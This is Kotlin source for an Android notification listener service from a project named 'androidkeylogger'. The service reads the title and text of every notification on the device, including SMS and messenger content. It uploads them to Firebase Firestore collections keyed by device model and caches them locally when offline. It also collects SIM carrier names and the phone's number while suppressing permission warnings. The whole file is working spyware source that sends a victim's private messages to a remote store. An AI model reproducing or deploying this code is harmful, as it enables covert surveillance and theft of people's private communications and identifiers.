package com.azamovhudstc.androidkeylogger.service

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.azamovhudstc.androidkeylogger.model.NotificationModel
import com.azamovhudstc.androidkeylogger.model.SimCardInfo
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileWriter
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MyNotificationListenerService : NotificationListenerService() {
    var lastNotification = ""
    private  val SHARED_PREFS_NAME = "my_shared_prefs"
    private  val IS_UPLOADED_KEY = "is_uploaded"
    private lateinit var firestore: FirebaseFirestore
    private val notifications = mutableListOf<NotificationModel>()
    private val fileName = "notifications.txt"
    private fun isInternetAvailable(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    private fun isLocalNotificationsAvailable(): Boolean {
        val file = File(filesDir, fileName)
        return file.exists()
    }

    private fun saveNotificationToFileLocal(notification: NotificationModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileName)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun readNotificationsFromFileLocal() {
        val file = File(filesDir, fileName)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<NotificationModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, NotificationModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                notifications.addAll(savedNotifications)
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }


    private fun saveNotificationToFirestore(notification: NotificationModel) {
        val deviceModel = Build.MODEL
        val dataCollection = firestore.collection("notifications_$deviceModel")
        dataCollection.get()
            .addOnSuccessListener { querySnapshot ->
                var shouldAdd = true
                for (document in querySnapshot.documents) {
                    val existingNotification = document.toObject(NotificationModel::class.java)
                    if (existingNotification != null && existingNotification.text == notification.text) {
                        shouldAdd = false
                        break
                    }
                }
                if (shouldAdd) {
                    dataCollection.add(notification)
                        .addOnSuccessListener {
                            Log.d("Firestore", "Notification added to Firestore successfully")
                        }
                        .addOnFailureListener { e ->
                            Log.e(
                                "Firestore",
                                "Error adding notification to Firestore: ${e.message}"
                            )
                        }
                } else {
                    Log.d(
                        "Firestore",
                        "Notification with the same text already exists in Firestore, skipping addition"
                    )
                }
            }
            .addOnFailureListener { e ->
                Log.e("Firestore", "Error retrieving notifications from Firestore: ${e.message}")
            }
    }


    @OptIn(DelicateCoroutinesApi::class)
    private fun uploadLocalNotificationsToFireStore() {
        val file = File(filesDir, fileName)
        if (file.exists()) {
            val gson = Gson()
            val notificationsToUpload = mutableListOf<NotificationModel>()

            file.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    val notificationModel = gson.fromJson(line, NotificationModel::class.java)
                    notificationsToUpload.add(notificationModel)
                }
            }

            val deviceModel = Build.MODEL
            val dataCollection = firestore.collection("notifications_$deviceModel")

            GlobalScope.launch(Dispatchers.IO) {
                val uniqueTextSet = mutableSetOf<String>() // Unique text set

                // Iterate through notifications to upload
                notificationsToUpload.forEachIndexed { index, notification ->
                    // Check if the text is unique
                    if (!uniqueTextSet.contains(notification.text)) {
                        // Add text to unique set
                        uniqueTextSet.add(notification.text)

                        // Upload notification to Firestore
                        dataCollection.add(notification)
                            .addOnSuccessListener {
                                // Delete the notification from local file after successfully uploaded to Firestore
                                deleteNotificationFromLocalFile(notification)
                            }
                            .addOnFailureListener { e ->
                                Log.e(
                                    "Firestore",
                                    "Error uploading notification to Firestore: ${e.message}"
                                )
                                // Handle failure
                            }
                    } else {
                        // If duplicate, delete notification from local file
                        deleteNotificationFromLocalFile(notification)
                    }
                }
            }
        }
    }

    private fun deleteNotificationFromLocalFile(notification: NotificationModel) {
        val file = File(filesDir, fileName)
        val tempList = mutableListOf<NotificationModel>()
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, NotificationModel::class.java)
                    if (notificationModel != notification) {
                        tempList.add(notificationModel)
                    }
                }
                reader.close()

                file.delete()

                val writer = FileWriter(file, true)
                tempList.forEach { tempNotification ->
                    val notificationJson = gson.toJson(tempNotification)
                    writer.append(notificationJson)
                    writer.append("\n")
                }
                writer.close()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        firestore = FirebaseFirestore.getInstance()

    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)
        val notification = sbn.notification
        val extras = notification.extras
        val title = extras.getString("android.title")
        val text = extras.getCharSequence("android.text")?.toString()
        val packageName = sbn.packageName
        val timeStamp = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
        val dayTime = SimpleDateFormat("yyyy-MM-dd-HH:mm", Locale.getDefault()).format(Date())

        if (title != null && text != null && lastNotification != text) {
            lastNotification = text
            Log.d("NotificationListener", "Package: $packageName, Title: $title, Text: $text")
            // Handle the received SMS or message here
            // MainActivity da updateRecyclerView ni chaqirish

//            saveNotificationToFile(NotificationModel(packageName, title, text))
            if (!packageName.isNullOrBlank() && !title.isNullOrBlank() && !text.isNullOrBlank()) {
                val notificationModel = NotificationModel(
                    packageName,
                    title,
                    text,
                    timeStamp!!,
                    dayTime!!
                )
                if (isInternetAvailable(this@MyNotificationListenerService)) {
                    if (isLocalNotificationsAvailable()) {
                        saveNotificationToFirestore(notificationModel)
                        uploadLocalNotificationsToFireStore()

                    } else {
                        uploadToFireStoreSimCardInfo(getDualSimInfo(applicationContext))
                        saveNotificationToFirestore(notificationModel)
                    }
                } else {
                    saveNotificationToFileLocal(notificationModel)
                }
                val intent = Intent("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
                intent.putExtra("packageName", packageName)
                intent.putExtra("title", title)
                intent.putExtra("text", text)
                intent.putExtra("date", timeStamp)
                intent.putExtra("dayTime", dayTime)
                sendBroadcast(intent)
            }
        }

    }


    private fun saveIsUploadedToSharedPreferences(context: Context, isUploaded: Boolean) {
        val sharedPrefs = context.getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE)
        val editor = sharedPrefs.edit()
        editor.putBoolean(IS_UPLOADED_KEY, isUploaded)
        editor.apply()
    }

    private fun getIsUploadedFromSharedPreferences(context: Context): Boolean {
        val sharedPrefs = context.getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE)
        return sharedPrefs.getBoolean(IS_UPLOADED_KEY, false) // Agar qiymat topilmasa, false qaytariladi
    }


    private fun uploadToFireStoreSimCardInfo(simCardInfoList: List<SimCardInfo>) {
        val db = FirebaseFirestore.getInstance()
        val deviceModel = Build.MODEL
        val isUploaded = getIsUploadedFromSharedPreferences(applicationContext)
        if (!isUploaded) {
            val simCardsCollection = db.collection("sim_cards_$deviceModel")

            for (simCardInfo in simCardInfoList) {
                simCardsCollection.add(simCardInfo)
                    .addOnSuccessListener { documentReference ->
                        println("DocumentSnapshot added with ID: ${documentReference.id}")
                        saveIsUploadedToSharedPreferences(applicationContext, true) // Mark as uploaded
                    }
                    .addOnFailureListener { e ->
                        println("Error adding document: $e")
                    }
            }
        }
    }



    @SuppressLint("ServiceCast", "HardwareIds", "MissingPermission")
    fun getDualSimInfo(context: Context): List<SimCardInfo> {
        val subscriptionManager = SubscriptionManager.from(context)
        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val subscriptionInfoList =  subscriptionManager.activeSubscriptionInfoList
        val simInfoList = mutableListOf<SimCardInfo>()

        if (subscriptionInfoList != null && subscriptionInfoList.size >= 2) {
            for (info in subscriptionInfoList) {
                val carrierName = info.carrierName?.toString() ?: "N/A"
                val number = telephonyManager.line1Number ?: "N/A"
                val simInfo = SimCardInfo(info.simSlotIndex + 1, carrierName, number)
                simInfoList.add(simInfo)
            }
        }
        Log.d("EVENT", "getDualSimInfo: $simInfoList ")
        return simInfoList
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)

    }
}
